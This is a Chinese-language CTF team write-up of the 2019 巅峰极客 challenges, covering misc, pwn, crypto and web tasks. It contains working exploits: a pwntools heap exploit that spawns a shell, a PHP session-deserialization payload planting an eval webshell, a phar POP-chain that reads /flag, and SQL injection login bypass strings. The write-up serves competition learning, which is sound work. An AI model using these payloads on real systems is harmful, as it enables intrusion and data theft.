> 原文链接: https://www.anquanke.com//post/id/189142 


# 2019巅峰极客网络安全技能挑战赛Writewp SUS_2019


                                阅读量   
                                **788527**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01d93250389ad4a257.png)](https://p5.ssl.qhimg.com/t01d93250389ad4a257.png)



## 前言

SUS_2019的师傅们肝了一天，最终排名第三，可能是强队主力都去参加另一个比赛了,2333~



## Misc

### <a class="reference-link" name="%E7%AD%BE%E5%88%B0"></a>签到

打开即可看到flag

[![](https://p2.ssl.qhimg.com/t01e4912d1a12975a66.png)](https://p2.ssl.qhimg.com/t01e4912d1a12975a66.png)

### <a class="reference-link" name="steganography"></a>steganography

下载下来一个PNG，十六进制打开，发现后面有50 4b，foremost分离出一个压缩包，有个pyc文件，以及word/下有个flag.xml。

flag.xml用十六进制编辑器打开，如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0170f97593224da02d.png)

0010000化成0，00001001化成1，可以化成如下：

[![](https://p1.ssl.qhimg.com/t013e340a908528e155.png)](https://p1.ssl.qhimg.com/t013e340a908528e155.png)

得到一串字符：flag`{`2806105f-ec43-

打开word文档，得到一大串base64编码过得字符串，利用以下base64隐写解密代码获得

```
def get_base64_diff_value(s1, s2):
    base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in xrange(len(s2)):
        if s1[i] != s2[i]:
            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
    return res
def solve_stego():
    with open('3.txt', 'rb') as f:
        file_lines = f.readlines()
        bin_str = ''
        for line in file_lines:
            steg_line = line.replace('n', '')
            norm_line = line.replace('n', '').decode('base64').encode('base64').replace('n', '')
            diff = get_base64_diff_value(steg_line, norm_line)
            print diff
            pads_num = steg_line.count('=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pads_num * 2)
            else:
                bin_str += '0' * pads_num * 2
def goflag(bin_str):
    res_str = ''
    for i in xrange(0, len(bin_str), 8):
        res_str += chr(int(bin_str[i:i + 8], 2))
    return res_str
if __name__ == '__main__':
    solve_stego()
```

压缩包密码密码I4mtHek3y@ ，得到pyc文件。利用[https://github.com/AngelKitty/stegosaurus获得pyc隐写信息](https://github.com/AngelKitty/stegosaurus%E8%8E%B7%E5%BE%97pyc%E9%9A%90%E5%86%99%E4%BF%A1%E6%81%AF)

57f3-8cb4-1add2793f508`}`

### <a class="reference-link" name="MBP%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%EF%BC%81"></a>MBP是最好的！

下载下来一个dmg文件，发现360将其标识为压缩文件，解压缩得到一堆文件。索性搜索flag，发现两个flag.zip。不一样大小，其中一个菜trash下，感觉这个有问题。 发现是加密的，没有说损坏。索性爆破密码，得到flag。

[![](https://p0.ssl.qhimg.com/t013935e878bd760f05.png)](https://p0.ssl.qhimg.com/t013935e878bd760f05.png)

密码1568207249，即可得到flag`{`Funny_40rensics`}`



## Pwn

### <a class="reference-link" name="NinjaRunning"></a>NinjaRunning

请输入操作内容打开文件发现是unity写的游戏，跟前几天嘶吼ctf的tank游戏类似，直接用dnSpy反编译Assembly-CSharp.dll。在PlayerMove类中找到出flag函数C0t1Nu30RnOt()。

[![](https://p0.ssl.qhimg.com/t0112da554d724fbb06.png)](https://p0.ssl.qhimg.com/t0112da554d724fbb06.png)

发现最后应该是通过爆破获取text。难点就是获取readlist，bluelist等变量的初始值。通过dnSpy在代码中插入FlagText.**instance.flag = s + “**”,利用flag的位置输出各个点以及Moon和Cloud的初始值，获取了5个蓝色和5个红色的位置数据。

[![](https://p0.ssl.qhimg.com/t017d919eb8fb9b061f.png)](https://p0.ssl.qhimg.com/t017d919eb8fb9b061f.png)

redlist = [‘16.891.93’, ‘27.081.46’, ‘57.909.50’, ‘75.809.50’, ‘47.009.70’]

bluelist =[‘8.239.85’,’14.60-16.40’,’-17.80-11.50’, ‘-17.1052.30’, ‘8.4523.03’]

然后利用脚本组合所有的情况进行暴力跑，发现没有匹配到相应的sha1值。调试了好久好久都没有找到问题原因，陷入自闭。。。。。从头梳理发现初始值可能不止图片显示的10个球，但是也没有找到好的调试方法获取初始值。怀疑在墙后面隐藏有蓝色或者红色，通过修改代码尝试让小人穿墙，在不停的游戏中，有师傅突然发现score变成了6，说明吃了6个红球，由此找到了最后隐藏的一个球的位置（58.8032.10）。然后再用脚本跑，出了flag。

[![](https://p3.ssl.qhimg.com/t01bbfd0f20ca25cd84.png)](https://p3.ssl.qhimg.com/t01bbfd0f20ca25cd84.png)

```
import itertools
import hashlib
stext = 'Shak3 1T UP W1th U'
redstr = 'T1ll W3 me3T @ s0m3Day'
bluestr = 'Enjoy th1s cup of T3a'
redlist = ['16.891.93', '27.081.46', '57.909.50', '75.809.50', '47.009.70','58.8032.10']
bluelist =['8.239.85','14.60-16.40','-17.80-11.50', '-17.1052.30', '8.4523.03']
Moon = '17'
Cloud = '23'
hp = [0,2,4,6,8,10]
score = [0,1,2,3,4,5,6,7,8,9,10]
flag_sha='FAF7AAE1DCC19A7D19A5D412A56D7B31554E5D7A'
def Xor(s1, s2):
    temp = ''
    if (len(s1)&lt;len(s2)):
        for i in range(len(s1)):
           temp += str(ord(s1[i])^ord(s2[i]))
        return temp+s2[len(s1):]
    return "Al1tt13T3A"

redlists = ['']
for i in range(1,7):
    for redcombi in itertools.combinations(redlist,i):
        for rediter in itertools.permutations(redcombi):
            red1= ''
            redlists.append(rediter)

bluelists = ['']
for i in range(1,6):
    for bluecombi in itertools.combinations(bluelist,i):
        for blueiter in itertools.permutations(bluecombi):
            bluelists.append(blueiter)

for i in redlists:
    for j in bluelists:
        red_temp=''
        blue_temp=''
        for ii in i:
            red_temp+=Xor(ii, redstr)
        for jj in j:
            blue_temp+=Xor(jj, bluestr)
        for m in hp:
            for n in score:
                s_temp= stext+red_temp+blue_temp+Xor(Moon, Cloud)+str(m^0x1234)+str(n^0x4321)
                hash = hashlib.sha1(s_temp.encode()).hexdigest()
                # print hash
                if hash == flag_sha.lower():
                    print "flag`{`"+hashlib.md5(s_temp.encode()).hexdigest().upper()[:10] + "`}`"
                    exit()
```

### <a class="reference-link" name="Snote"></a>Snote

本题漏洞点在于edit 8字节溢出 并且free后指针不置空，导致free后还可以通过指针修改内存。

利用思路：只有一个指针变量，不断更新其值。通过溢出，可以修改top chunk size。使用 house of orange 技术，利用内存对齐进行size修改，进而将ptr调整至泄露main_arena某偏移，计算出libc基地址。

而后删除元素，进入fastbin中，利用fastbin attack，将被释放的chunk改写，修改bins结构，进行攻击，写入攻击地址并写入攻击函数。最后调用malloc来get shell

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'

p = process('./pwn')
#p = remote('55fca716.gamectf.com','37009')
e = ELF('./pwn')



def add(size,content):
    p.recvuntil("Your choice &gt; ")
    p.sendline('1')
    p.recvuntil("&gt; ")
    p.sendline(str(size))
    p.recvuntil("n")
    p.send(content)


def edit(size,content):
    p.recvuntil("Your choice &gt; ")
    p.sendline('4')
    p.recvuntil("&gt; ")
    p.sendline(str(size))
    p.recvuntil("n")
    p.send(content)


def show():
    p.recvuntil("Your choice &gt; ")
    p.sendline('2')

def dele():
    p.recvuntil("Your choice &gt; ")
    p.sendline('3')



p.recv()
p.sendline('hehe')


add(0x18,'a')
edit(0x20,p64(0)*3+p64(0xfe1))
add(0xff0,'a')
add(0x60,'x00')
show()
re = u64(p.recv(8))  
libc_address =re - 0x3c5100
print hex(re)
print hex(libc_address)
raw_input()
dele()
edit(0x60,p64(libc_address+0x3c4b10-0x13))

#one = 0x45216
#one = 0x4526a
one = 0xf02a4
#one = 0xf1147

add(0x60,'a')
add(0x60,'a'*3+p64(one+libc_address))

p.interactive()
```

而后 interactive中调用 malloc，getshell，输入token即可



## Crypto

### <a class="reference-link" name="CoCo"></a>CoCo

稍微美化一下代码（改变一下变量），代码如下：

```
from Crypto.Util.number import *
from Crypto.Random.random import *
from flag import flag

a = getStrongPrime(1024)
b = getStrongPrime(1024)
c = getStrongPrime(1024)

def gcd(Co, CoCo):
    while CoCo: Co, CoCo = CoCo, Co % CoCo
    return Co

def pow(n, CoCo, CoCoCo):
    tmp = 1
    while CoCo != 0:
        if (CoCo &amp; 1) == 1:
            tmp = (tmp * n) % CoCoCo
        CoCo &gt;&gt;= 1
        n = (n * n) % CoCoCo
    return tmp

d = pow(c, a, b)
while True:
    f = randint(1, 2 ** 512)
    if gcd(f, b - 1) == 1:
        break
g = pow(c, f, b)
m1 = bytes_to_long("CoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCo")
c1 = (m1 * pow(d, f, b)) % b
m2 = bytes_to_long(flag)
c2 = (m2 * pow(d, f, b)) % b
with open('cipher.txt', 'w') as f:
    f.write("g = " + str(g) + "n")
    f.write("c = " + str(c) + "n")
    f.write("c1 = " + str(c1) + "n")
    f.write("b = " + str(b) + "n")
    f.write("c2 = " + str(c2) + "n")
```

payload显然如下：

```
from Crypto.Util.number import *
import gmpy2

c1 = 120085813769601903784459580746767828105716607333492124010803514777437504109331448009890874939858984666641139819379969714070220763093188551966830630639308142299719976258227450642141963425187429636880593480951498406380068747404115889400485463839002674872020074254287490910994729347868122864760194135575038263365
b = 133694097868622092961596455982173439482901807533684907590429464542321832157724052684517499871073826858762297729480414306161113412741865099163152505447334863097434932940729269605986418443532208942119505043634990271717198694190123478547503837269948205839761848366722796091382894026537012764323367229104988051357
c2 = 53913320010474614353771348695262553935361078517742942745359182152882204780769206005474818637010209561420480280523029509375286538886061621596249179407728697515399046471231513536340506648832858695583318765423245104561512700887050932667507358898646356134386213016528778706360147066411877832628237361011621917972

m1 = bytes_to_long(b"CoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCoCo")
tmp = c1*gmpy2.invert(m1,b)%b
flag = c2*gmpy2.invert(tmp,b)%b
print long_to_bytes(flag)
```



## Web

### <a class="reference-link" name="lol"></a>lol

对上传与下载做测试，使用名为upload的PHPSESSID上传文件后再将PHPSESSID更改为upload/../../,请求download/index.php可以下载到index.php的源码。同理可以下载到整个站点的源码。

在core/config.php中

```
&lt;?php
$config=array(
    'debug'=&gt;'false',
    'ini'=&gt;array(
        'session.name' =&gt; 'PHPSESSID',
        'session.serialize_handler' =&gt; 'php'
    )
);
```

可以看到这里更改了session.serialize_handler为php，猜测考察session反序列化。

联系`app/model/Cache.class.php`

```
&lt;?php
class Cache`{`
    public $data;
    public $sj;
    public $path;
    public $html;
    function __construct($data)`{`
        $this-&gt;data['name']=isset($data['post']['name'])?$data['post']['name']:'';
        $this-&gt;data['message']=isset($data['post']['message'])?$data['post']['message']:'';
        $this-&gt;data['image']=!empty($data['image'])?$data['image']:'/static/images/pic04.jpg';
        $this-&gt;path=Cache_DIR.DS.session_id().'.php';
    `}`

    function __destruct()`{`
        $this-&gt;html=sprintf('&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    &lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;',substr($this-&gt;data['name'],0,62),$this-&gt;data['image'],$this-&gt;data['message'],session_id().'.jpg');

        if(file_put_contents($this-&gt;path,$this-&gt;html))`{`
            include($this-&gt;path);
        `}`
    `}`
`}`
```

此处存在反序列化漏洞可以使我们写入shell并包含。

```
&lt;form action="题目地址/index.php" method="POST" enctype="multipart/form-data"&gt;
    &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt;
    &lt;input type="file" name="file" /&gt;
    &lt;input type="submit" /&gt;
&lt;/form&gt;
```

随便上传一个文件，抓包并修改filename为

```
file"; filename="§|O:5:§"Cache":4:`{`s:4:"data";a:3:`{`s:7:"message";s:24:"&lt;?php eval($_GET[qq]);?&gt;";s:4:"name";s:1:"t";s:5:"image";s:1:"t";`}`s:2:"sj";N;s:4:"path";s:23:"/var/www/html/write.php";s:4:"html";N;`}`"
```

用intruder无限循环请求，访问/index.php?qq=system(‘cat+/flag’);即可获取到flag。

### <a class="reference-link" name="upload"></a>upload

[![](https://p3.ssl.qhimg.com/t01851c188ed4629e62.png)](https://p3.ssl.qhimg.com/t01851c188ed4629e62.png)

首先根据download.php可以看到此时可以传入name参数，并且此时我们传入的name将经过safe_replace()处理以后，然后进行文件下载，这里限制了文件名并且要求过滤了以后的文件名必须在白名单里面，因此这里要bypass一下safe_replace()，这里我尝试了&lt;&gt;，*，select，%，反引号，||，&amp;字符都没成功，当尝试反斜杠时，发现可以成功读取文件，因此可以直接下载所有源码文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013e3c335130b581d6.png)

[![](https://p3.ssl.qhimg.com/t0126f176019cfa3bf7.png)](https://p3.ssl.qhimg.com/t0126f176019cfa3bf7.png)

下载完源码以后就是代码审计，

根据这种自己写的几个php文件，第一个反应就是找存不存在反序列化的点

[![](https://p4.ssl.qhimg.com/t01056e84a1a1007b1d.png)](https://p4.ssl.qhimg.com/t01056e84a1a1007b1d.png)

这里明显存在phar反序列化，都考烂了，并且有上传文件的功能，路径也已知，并且这里并没有过滤phar，可以直接phar反序列化，那么确定了漏洞点，接下来就是找pop链

[![](https://p0.ssl.qhimg.com/t01eef775e784277258.png)](https://p0.ssl.qhimg.com/t01eef775e784277258.png)

class.php中Sh0w类存在destruct,Show类中存在wakeup函数，但是没法利用，因此选择Sh0w类的destruct来进行构造pop

[![](https://p1.ssl.qhimg.com/t0160f4e695d2533fcb.png)](https://p1.ssl.qhimg.com/t0160f4e695d2533fcb.png)

虽然这里调用了_show()方法，但是此时Show的_show函数过滤了过滤了flag，感觉没法利用

[![](https://p3.ssl.qhimg.com/t01c29a1ac5b23f5661.png)](https://p3.ssl.qhimg.com/t01c29a1ac5b23f5661.png)

[![](https://p0.ssl.qhimg.com/t01f109678f72b1bd2e.png)](https://p0.ssl.qhimg.com/t01f109678f72b1bd2e.png)

但是它还有个tostring()魔术方法，没有过滤，可以直接任意文件读取，当对象被当做字符串输出的时候，就能够触发该对象的toString()方法

[![](https://p2.ssl.qhimg.com/t01dae66af3c93959b4.png)](https://p2.ssl.qhimg.com/t01dae66af3c93959b4.png)

刚好S6ow存在file_get函数存在echo

[![](https://p1.ssl.qhimg.com/t012886c5049caa9167.png)](https://p1.ssl.qhimg.com/t012886c5049caa9167.png)

因此只要调用它，并令file为Show类的对象即可调用toString,那么此时我们只需要让Sh0w的str为S6ow类的对象，即可触发器call方法，这里

[![](https://p1.ssl.qhimg.com/t01bef8f8db5b14dfd5.png)](https://p1.ssl.qhimg.com/t01bef8f8db5b14dfd5.png)

我们只需要让this-&gt;`{`name`}`为file_get即可，结合

[![](https://p4.ssl.qhimg.com/t01ad885082ec478bc2.png)](https://p4.ssl.qhimg.com/t01ad885082ec478bc2.png)

get方法，当访问不存在的属性将访问其返回$this-&gt;params[$key]，因此这里我们就能够使用params[‘_show’]=“file_get”即可，要读取的flag位于/flag下，因此可以结合phar构造通用脚本构造exp如下：

```
&lt;?php
$phar = new Phar('test.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt','text');
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;");
class Show
`{`
    public $source;
    public function __construct()`{`
            $this-&gt;source="/flag";
    `}`
`}`

class S6ow
`{`
    public $file;
    public $params;


`}`
class Sh0w
`{`
    public $test;
    public $str;
`}`
$c=new Show();
$b=new S6ow();
$b-&gt;params['_show']="file_get";
$b-&gt;file=$c;
$object = new Sh0w();
$object-&gt;str=$b;
echo urlencode(serialize($object));
$phar-&gt;setMetadata($object);
$phar-&gt;stopBuffering();
```

[![](https://p5.ssl.qhimg.com/t01c5bd766b6b77638b.png)](https://p5.ssl.qhimg.com/t01c5bd766b6b77638b.png)

然后将base64解码就是flag

[![](https://p2.ssl.qhimg.com/t018d669c694d69fe80.png)](https://p2.ssl.qhimg.com/t018d669c694d69fe80.png)

### <a class="reference-link" name="%E9%9D%B6%E5%9C%BA-a_web1"></a>靶场-a_web1

[![](https://p1.ssl.qhimg.com/t0178d57ed6c7630e8c.png)](https://p1.ssl.qhimg.com/t0178d57ed6c7630e8c.png)

访问即提示只有admin才能看到flag，因此必须成为admin，看了一下cookie，不是flask的，应该不会是flask session伪造，这里直接登录注册，发现当注册的用户名存在敏感字符时会提示hacker

[![](https://p0.ssl.qhimg.com/t014752c57b45a8e9a3.png)](https://p0.ssl.qhimg.com/t014752c57b45a8e9a3.png)

那么应该漏洞点在用户名处，并且有很大可能是注入，因此尝试闭合单引号

当注册`wfz’/**/OR/**/’1`时，这时候可以成功登陆，并且此时用户名为test，说明闭合了单引号，因此成功登录了test用户，此时需要我们要登录admin

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0103403bde2cddd317.png)

尝试`wfz’/**/OR/**/name=’admin`即可拿到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018c9062bb1b202228.png)
